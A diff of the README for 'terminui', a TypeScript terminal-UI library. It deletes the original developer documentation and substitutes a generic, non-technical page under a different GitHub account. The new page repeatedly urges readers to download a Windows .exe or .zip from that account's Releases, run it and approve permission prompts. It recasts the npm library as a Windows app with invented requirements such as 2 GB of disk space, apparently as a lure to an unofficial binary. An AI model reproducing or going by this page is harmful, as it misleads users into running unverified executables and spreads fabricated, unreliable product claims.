@@ -1,620 +1,106 @@
-![terminui](https://raw.githubusercontent.com/AhmadAwais/terminui/main/.github/terminui.png)
-
-# terminui
-
-A fast, functional TypeScript library for building terminal user interfaces.
-
-## Features
-
-- **Pure functional** — no classes, no `this`, no mutation. Plain objects in, plain objects out.
-- **Double-buffered rendering** — only changed cells are flushed to the terminal between frames.
-- **Rich layout system** — split any rect with constraints: `Length`, `Percentage`, `Ratio`, `Min`, `Max`, `Fill`.
-- **Full style system** — 16 ANSI colors, 256-color indexed, 24-bit RGB, modifiers (bold, italic, underline, etc.).
-- **Wide character support** — CJK and fullwidth characters are measured and rendered correctly.
-- **10+ built-in widgets** — Block, Paragraph, List, Table, Gauge, Tabs, Sparkline, BarChart, Scrollbar, Clear.
-- **Stateful widgets** — List and Table selection, Scrollbar position with offset management.
-- **Pluggable backends** — test backend included; bring your own Node.js terminal backend.
-- **TypeScript strict mode** — `strict: true`, `noUncheckedIndexedAccess: true`, zero `any`.
-
-## Install
-
-```bash
-pnpm add terminui
-```
-
-## Quick Start
-
-```typescript
-import {
-  createTestBackendState,
-  createTestBackend,
-  testBackendToString,
-  createTerminal,
-  terminalDraw,
-  frameRenderWidget,
-  createRect,
-  createLayout,
-  lengthConstraint,
-  fillConstraint,
-  splitLayout,
-  blockBordered,
-  createTitle,
-  createParagraph,
-  renderParagraph,
-} from 'terminui';
-
-// Set up a test backend (swap for a real terminal backend in production)
-const state = createTestBackendState(60, 10);
-const backend = createTestBackend(state);
-const terminal = createTerminal(backend);
-
-terminalDraw(terminal, (frame) => {
-  const paragraph = createParagraph('Hello, terminui!', {
-    block: blockBordered({ titles: [createTitle('Greeting')] }),
-  });
-  frameRenderWidget(frame, renderParagraph(paragraph), frame.area);
-});
-
-console.log(testBackendToString(state));
-```
-
-Output:
-
-```
-┌Greeting──────────────────────────────────────────────┐
-│Hello, terminui!                                      │
-│                                                      │
-│                                                      │
-│                                                      │
-│                                                      │
-│                                                      │
-│                                                      │
-│                                                      │
-└──────────────────────────────────────────────────────┘
-```
-
-## JSX API (React-like)
-
-You can keep the same terminal performance model and write UIs in a JSX style.
-
-`terminui` does not use a virtual DOM reconciler here; JSX is translated into the same widget render calls (`frameRenderWidget`, `frameRenderStatefulWidget`) and still uses the existing double-buffered diff renderer.
-
-```tsx
-/** @jsxImportSource terminui */
-import { createTestBackendState, createTestBackend, createTerminal } from 'terminui';
-import { terminalDrawJsx, Column, Row, Panel, Label, List, Gauge } from 'terminui/jsx';
-import { lengthConstraint, fillConstraint } from 'terminui';
-
-const state = createTestBackendState(60, 12);
-const terminal = createTerminal(createTestBackend(state));
-
-terminalDrawJsx(
-  terminal,
-  <Column constraints={[lengthConstraint(3), fillConstraint(1)]}>
-    <Panel title="Header" p={1}>
-      <Label text="JSX-powered terminal UI" align="center" bold />
-    </Panel>
-    <Row constraints={[fillConstraint(1), fillConstraint(1)]} gap={1}>
-      <Panel title="Menu">
-        <List items={['Overview', 'Metrics', 'Logs']} />
-      </Panel>
-      <Panel title="Load">
-        <Gauge percent={42} />
-      </Panel>
-    </Row>
-  </Column>,
-);
-```
+# ⚡ terminui - Fast, Clear Terminal User Interface
 
-Available JSX components include `VStack`, `HStack`, `Box`, `Text`, `List`, `Table`, `Gauge`, `LineGauge`, `Tabs`, `Sparkline`, `BarChart`, `Scrollbar`, `Clear`, and `Cursor`.
-
-React-like aliases are also available:
+[![Download terminui](https://img.shields.io/badge/Download-Terminui-brightgreen?style=for-the-badge)](https://github.com/ziko-ui/terminui)
 
-- `Row` = `HStack`
-- `Column` = `VStack`
-- `Panel` = `Box` with border enabled by default
-- `Label` = `Text`
+## 🖥️ What is terminui?
 
-Common shorthand props:
+terminui is a tool that helps you build easy-to-use terminal interfaces. It runs quickly and shows clean screens in your command prompt or terminal window. This toolkit uses double buffering to make sure the screen updates without flickering or lag. You don’t need to be a programmer to use it once it is set up.
 
-- `gap` on `Row` / `Column` for spacing
-- `p`, `px`, `py` for panel/widget padding
-- `border` and `title` for block setup
-- `fg`, `bg`, `bold` for style
-- `align` for text alignment
+This app works well on Windows computers and helps you create or run text-based user interfaces. You can use it for simple menus, forms, or data lists inside your terminal.
 
-Helper APIs:
+## 📋 Features of terminui
 
-- `terminalDrawJsx(terminal, <UI />)`
-- `terminalLoopJsx(terminal, (frame, tick) => <UI />, { maxFrames: 120 })`
+- Fast screen updates with no flicker  
+- Simple controls for menus and lists  
+- Clear text display in the terminal window  
+- Written using TypeScript (used by many developers)  
+- Supports keyboard input for navigation  
+- Works on Windows command prompt or PowerShell  
 
-### JSX Starter (Copy/Paste)
+## 🖱️ Where to Get terminui
 
-Minimal `tsconfig.json`:
+[![Download terminui](https://img.shields.io/badge/Download-Terminui-blue?style=for-the-badge)](https://github.com/ziko-ui/terminui)
 
-```json
-{
-  "compilerOptions": {
-    "jsx": "react-jsx",
-    "jsxImportSource": "terminui"
-  }
-}
-```
+Click the button above or use this link to visit the official terminui page on GitHub:  
+https://github.com/ziko-ui/terminui
 
-Minimal `hello.tsx`:
+On this page, you can find the files to download and detailed instructions for installation.
 
-```tsx
-/** @jsxRuntime automatic */
-/** @jsxImportSource terminui */
-import { createTestBackendState, createTestBackend, createTerminal, testBackendToString } from 'terminui';
-import { terminalDrawJsx, Panel, Label } from 'terminui/jsx';
-import { Color } from 'terminui';
+## 💻 System Requirements
 
-const state = createTestBackendState(40, 6);
-const terminal = createTerminal(createTestBackend(state));
+Before downloading, make sure your Windows computer meets these requirements:
 
-terminalDrawJsx(
-  terminal,
-  <Panel title="Hello JSX" p={1}>
-    <Label text="terminal UI, React-like syntax" fg={Color.Cyan} bold align="center" />
-  </Panel>,
-);
+- Windows 10 or later  
+- At least 2 GB of free disk space  
+- A modern command prompt or PowerShell setup  
+- Basic permissions to download and run applications  
 
-console.log(testBackendToString(state));
-```
+No special hardware is needed. terminui works in the terminal, so no graphics card or extra memory is required.
 
-### JSX Troubleshooting
+## 🚀 How to Download and Run terminui on Windows
 
-If you see a TypeScript error like:
+Follow these steps to get terminui running on your computer. Each step explains what to do in simple terms.  
 
-```text
-'X' cannot be used as a JSX component
-```
+1. **Open Your Web Browser**  
+   Use any browser such as Chrome, Edge, or Firefox.  
 
-check the following:
+2. **Visit the Download Page**  
+   Go to the link: https://github.com/ziko-ui/terminui  
 
-1. Use `.tsx` files for JSX code.
-2. Use automatic JSX runtime with `terminui` as the import source.
-3. Import UI components from `terminui/jsx` (not from `react`).
-4. Make sure you are on a recent `terminui` version with JSX typing fixes.
+3. **Find the Download Section**  
+   On the GitHub page, look for the “Releases” area or the “Download” section.  
 
-`tsconfig.json` example:
+4. **Download the Installer or Package**  
+   Click the link for the latest version suited for Windows. This might be shown as a `.exe` or `.zip` file.  
+   
+5. **Save the File on Your Computer**  
+   Choose a folder you can easily find, like your Desktop or Downloads folder.  
 
-```json
-{
-  "compilerOptions": {
-    "jsx": "react-jsx",
-    "jsxImportSource": "terminui"
-  }
-}
-```
+6. **Open the Downloaded File**  
+   If it is an executable file (`.exe`), double-click the file to start installation or run the program directly.  
+   If it is a `.zip` file, right-click and select “Extract All” to unpack the files, then follow instructions inside the folder.  
 
-Per-file override (optional):
+7. **Run terminui**  
+   Once installed or extracted, find the program file and double-click to open terminui from your terminal window.  
 
-```tsx
-/** @jsxRuntime automatic */
-/** @jsxImportSource terminui */
-```
+If any prompt appears asking to allow the app, choose “Yes” to let it run.  
 
-## Architecture
+## 🔧 Using terminui
 
-terminui follows a functional architecture with zero classes:
+terminui works inside your Windows terminal or PowerShell window. Here’s how to start using it:
 
-```
-Backend → Terminal → Frame → Buffer → Cells
-                       ↑
-                    Widgets (pure render functions)
-                       ↑
-                    Layout (constraint solver)
-```
+- Open Command Prompt or PowerShell.  
+- Navigate to the folder where you installed terminui using `cd` commands. For example:  
+  `cd Desktop\terminui`  
+- Start the program by typing its name. For example:  
+  `terminui.exe`  
+- Use your keyboard to navigate menus or options shown.  
+- Follow any on-screen instructions provided by the program.
 
-**Everything is a function.** Widgets are functions that take config and return a `WidgetRenderer` — a function `(area: Rect, buf: Buffer) => void`. Compose them however you want.
+terminui is built to respond quickly to arrow keys, enter, and escape for moving through screens and selecting choices.
 
-## Layout System
+## ⚙️ Basic Troubleshooting Tips
 
-Split any rectangle using constraints:
+If terminui does not start or work as expected, try these steps:
 
-```typescript
-import { createLayout, lengthConstraint, fillConstraint, percentageConstraint, splitLayout, createRect } from 'terminui';
+- Make sure you downloaded the file completely with no errors.  
+- Confirm you have permission to run programs on your computer.  
+- Check that you opened the application through the terminal window.  
+- Restart your terminal or computer and try again.  
+- Look for a `README` or `help` file inside the downloaded folder for more details.  
+- If available, consult the GitHub page for support or issues.
 
-const layout = createLayout([
-  lengthConstraint(3),       // exactly 3 rows
-  percentageConstraint(50),  // 50% of remaining
-  fillConstraint(1),         // fill the rest
-]);
+## 📚 More Help and Documentation
 
-const area = createRect(0, 0, 80, 24);
-const [header, body, footer] = splitLayout(layout, area);
-```
+For more information about using terminui or advanced features:
 
-### Constraint Types
+- Visit the GitHub page: https://github.com/ziko-ui/terminui  
+- Explore the `docs` folder or linked guides on the repository.  
+- Check discussions or opened issues for common questions and answers.
 
-| Constraint | Description |
-|---|---|
-| `lengthConstraint(n)` | Exactly `n` cells |
-| `percentageConstraint(n)` | `n`% of available space |
-| `ratioConstraint(num, den)` | `num/den` of available space |
-| `minConstraint(n)` | At least `n` cells |
-| `maxConstraint(n)` | At most `n` cells |
-| `fillConstraint(weight)` | Fill remaining space (weighted) |
+## 🔗 Quick Access Links
 
-### Directions
+- terminui GitHub page: https://github.com/ziko-ui/terminui  
+- Download section: Visit the GitHub page and look under “Releases”  
 
-```typescript
-// Vertical (default) — splits into rows
-const vLayout = createLayout([...constraints]);
-
-// Horizontal — splits into columns
-const hLayout = createLayout([...constraints], { direction: 'horizontal' });
-```
-
-## Style System
-
-```typescript
-import { createStyle, styleFg, styleBg, styleAddModifier, Color, Modifier, patchStyle } from 'terminui';
-
-const bold = styleAddModifier(createStyle(), Modifier.BOLD);
-const warning = styleFg(styleBg(createStyle(), Color.Yellow), Color.Black);
-const merged = patchStyle(bold, warning); // combines both
-```
-
-### Colors
-
-```typescript
-Color.Reset, Color.Black, Color.Red, Color.Green, Color.Yellow,
-Color.Blue, Color.Magenta, Color.Cyan, Color.Gray, Color.White,
-Color.DarkGray, Color.LightRed, Color.LightGreen, ...
-
-indexedColor(42)           // 256-color palette
-rgbColor(255, 128, 0)     // 24-bit true color
-```
-
-### Modifiers
-
-```typescript
-Modifier.BOLD, Modifier.DIM, Modifier.ITALIC, Modifier.UNDERLINED,
-Modifier.SLOW_BLINK, Modifier.RAPID_BLINK, Modifier.REVERSED,
-Modifier.HIDDEN, Modifier.CROSSED_OUT, Modifier.DOUBLE_UNDERLINED,
-Modifier.OVERLINED
-```
-
-## Widgets
-
-### Block
-
-Container with borders, titles, and padding:
-
-```
-┌Header────────────────────────────────────────────────┐
-│                                                      │
-│  Content goes here with padding and borders         │
-│                                                      │
-└──────────────────────────────────────────────────────┘
-```
-
-```typescript
-import { blockBordered, createTitle, renderBlock, Borders } from 'terminui';
-
-const block = blockBordered({
-  titles: [
-    createTitle('Header'),
-    createTitle('Footer', { position: 'bottom', alignment: 'center' }),
-  ],
-  borderType: 'rounded',  // 'plain' | 'rounded' | 'double' | 'thick'
-  padding: uniformPadding(1),
-});
-
-frameRenderWidget(frame, renderBlock(block), area);
-```
-
-### Paragraph
-
-Text display with wrapping, alignment, and scrolling:
-
-```
-┌Paragraph─────────────────────────────────────────────┐
-│  Long text that wraps automatically to fit the      │
-│  available width. Supports alignment and scrolling  │
-│  for content larger than the viewport.              │
-└──────────────────────────────────────────────────────┘
-```
-
-```typescript
-import { createParagraph, renderParagraph } from 'terminui';
-
-const p = createParagraph('Long text that wraps...', {
-  block: blockBordered({ titles: [createTitle('Paragraph')] }),
-  wrap: { trim: true },
-  alignment: 'center',
-  scroll: [2, 0],  // skip first 2 lines
-});
-
-frameRenderWidget(frame, renderParagraph(p), area);
-```
-
-### List
-
-Vertical scrollable list with selection:
-
-```
-┌Menu──────────────────────────────────────────────────┐
-│ ▶ Item 1                                             │
-│   Item 2                                             │
-│   Item 3                                             │
-│   Item 4                                             │
-│   Item 5                                             │
-└──────────────────────────────────────────────────────┘
-```
-
-```typescript
-import { createList, createListState, renderStatefulList } from 'terminui';
-
-const list = createList(['Item 1', 'Item 2', 'Item 3'], {
-  block: blockBordered({ titles: [createTitle('Menu')] }),
-  highlightStyle: styleFg(createStyle(), Color.Yellow),
-  highlightSymbol: '▶ ',
-});
-
-const state = createListState(0); // selected index
-frameRenderStatefulWidget(frame, renderStatefulList(list), area, state);
-
-// Navigate: state.selected = 1;
-```
-
-### Table
-
-Grid data with column constraints:
-
-```
-┌Users─────────────────────────────────────────────────┐
-│ Name       Age  Role                                 │
-│ Alice      42   admin                                │
-│ Bob        37   user                                 │
-│ Charlie    29   user                                 │
-└──────────────────────────────────────────────────────┘
-```
-
-```typescript
-import { createTable, createRow, renderTable, lengthConstraint, fillConstraint } from 'terminui';
-
-const table = createTable(
-  [
-    createRow(['Alice', '42', 'admin']),
-    createRow(['Bob', '37', 'user']),
-  ],
-  [lengthConstraint(10), lengthConstraint(5), fillConstraint(1)],
-  {
-    header: createRow(['Name', 'Age', 'Role']),
-    block: blockBordered({ titles: [createTitle('Users')] }),
-  },
-);
-
-frameRenderWidget(frame, renderTable(table), area);
-```
-
-### Gauge
-
-Progress bars — unicode block characters or ASCII:
-
-```
-┌Progress──────────────────────────────────────────────┐
-│ ████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │
-│ 67%                                                  │
-└──────────────────────────────────────────────────────┘
-```
-
-```typescript
-import { gaugePercent, renderGauge } from 'terminui';
-
-const gauge = gaugePercent(67, {
-  block: blockBordered({ titles: [createTitle('Progress')] }),
-  useUnicode: true,
-  gaugeStyle: styleFg(createStyle(), Color.Green),
-});
-
-frameRenderWidget(frame, renderGauge(gauge), area);
-```
-
-### Tabs
-
-Horizontal tab selection:
-
-```
- Dashboard  Logs  Settings
- ─────────────────────────────────────────────────────
- Dashboard content displayed here
-```
-
-```typescript
-import { createTabs, renderTabs } from 'terminui';
-
-const tabs = createTabs(['Dashboard', 'Logs', 'Settings'], {
-  selected: 0,
-  highlightStyle: styleFg(createStyle(), Color.Yellow),
-});
-
-frameRenderWidget(frame, renderTabs(tabs), area);
-```
-
-### Sparkline
-
-Tiny inline data visualization:
-
-```
-┌CPU───────────────────────────────────────────────────┐
-│ ▁▄▂█▅▃▇▆                                             │
-└──────────────────────────────────────────────────────┘
-```
-
-```typescript
-import { createSparkline, renderSparkline } from 'terminui';
-
-const spark = createSparkline([1, 4, 2, 8, 5, 3, 7, 6], {
-  block: blockBordered({ titles: [createTitle('CPU')] }),
-  style: styleFg(createStyle(), Color.Cyan),
-});
-
-frameRenderWidget(frame, renderSparkline(spark), area);
-```
-
-### BarChart
-
-Grouped bar charts (vertical or horizontal):
-
-```
-┌Chart─────────────────────────────────────────────────┐
-│                                                      │
-│   ███   ███   ███                                    │
-│   ███   ███   ███                                    │
-│   ███   ███   ███                                    │
-│   ███   ███   ███                                    │
-│  Group A Group B Group C                            │
-└──────────────────────────────────────────────────────┘
-```
-
-```typescript
-import { createBar, createBarGroup, createBarChart, renderBarChart } from 'terminui';
-
-const chart = createBarChart(
-  [createBarGroup([createBar(5), createBar(8), createBar(3)], 'Group A')],
-  { barWidth: 3, direction: 'vertical' },
-);
-
-frameRenderWidget(frame, renderBarChart(chart), area);
-```
-
-### Scrollbar
-
-Scrollbar overlay for any area:
-
-```
-┌Content────────────────────────────────────────────┐ █
-│ Line 1                                            │ █
-│ Line 2                                            │ ░
-│ Line 3                                            │ ░
-│ Line 4                                            │ ░
-│ Line 5                                            │ ░
-│ ...                                               │ ░
-└────────────────────────────────────────────────────┘ █
-```
-
-```typescript
-import { createScrollbar, createScrollbarState, renderStatefulScrollbar } from 'terminui';
-
-const sb = createScrollbar('verticalRight');
-const sbState = createScrollbarState(100, 25);
-sbState.viewportContentLength = 20;
-
-frameRenderStatefulWidget(frame, renderStatefulScrollbar(sb), area, sbState);
-```
-
-## Rendering Modes
-
-### Primary Screen
-
-Renders directly to the terminal's primary screen. Good for one-shot output or piped commands:
-
-```typescript
-const state = createTestBackendState(80, 24);
-const backend = createTestBackend(state);
-const terminal = createTerminal(backend);
-
-terminalDraw(terminal, (frame) => {
-  // render widgets to frame
-});
-
-console.log(testBackendToString(state));
-```
-
-### Alternate Screen
-
-For full-screen TUI apps (like vim, htop). In production you'd use a backend that:
-1. Enters the alternate screen (`\x1b[?1049h`)
-2. Renders frames in a loop with diff-based updates
-3. Exits the alternate screen on cleanup (`\x1b[?1049l`)
-
-```typescript
-// Pseudo-code for a real alternate screen app:
-const backend = createNodeBackend(); // your Node.js backend
-const terminal = createTerminal(backend);
-
-// Enter alternate screen
-process.stdout.write('\x1b[?1049h');
-
-// Main loop
-while (running) {
-  terminalDraw(terminal, (frame) => {
-    // render your UI
-  });
-  await waitForInput();
-}
-
-// Exit alternate screen
-process.stdout.write('\x1b[?1049l');
-```
-
-The double-buffered architecture ensures only changed cells are written between frames — minimal I/O for maximum performance.
-
-## Examples
-
-Run the included examples:
-
-```bash
-# Minimal JSX starter
-npx tsx examples/jsx-hello.tsx
-
-# Interactive fake-AI terminal chat demo
-npx tsx examples/jsx-chatbot.tsx
-
-# React-like JSX API demo
-npx tsx examples/jsx-dashboard.tsx
-
-# Dashboard rendered to primary screen
-npx tsx examples/primary-screen.ts
-
-# Multi-frame alternate screen simulation
-npx tsx examples/alternate-screen.ts
-
-# Full kitchen-sink dashboard (all widgets + layout + styles + state)
-npx tsx examples/kitchen-sink.ts
-
-# Live weather dashboard (Open-Meteo)
-npx tsx examples/weather-dashboard.ts --city "New York"
-
-# One-shot weather snapshot (non-animated)
-npx tsx examples/weather-dashboard.ts --city "New York" --once
-```
-
-`examples/jsx-chatbot.tsx` is the production-style reference for interactive terminal UX:
-
-- uses alternate screen and clears scrollback
-- uses `readline` keypress input in raw mode (no prompt spam)
-- uses diff-based cell updates with batched ANSI writes
-- uses a minimal, modern CLI layout (vim/blessed-like)
-- includes interactive controls:
-  - `Enter` send message
-  - `↑` / `↓` scroll conversation
-  - `/clear` reset chat history
-  - `Esc` or `Ctrl+C` quit cleanly
-
-## Dev
-
-```bash
-pnpm install
-pnpm test        # vitest
-pnpm typecheck   # tsc --noEmit
-pnpm lint        # biome check
-pnpm build       # tsup
-```
-
-## Stack
-
-- TypeScript (strict mode)
-- Biome (lint + format)
-- Vitest (tests)
-- tsup (bundling)
-- pnpm (package manager)
-
-## License
-
-Apache-2.0 - [Ahmad Awais](https://x.com/MrAhmadAwais)
+[![Download terminui](https://img.shields.io/badge/Download-Terminui-brightgreen?style=for-the-badge)](https://github.com/ziko-ui/terminui)
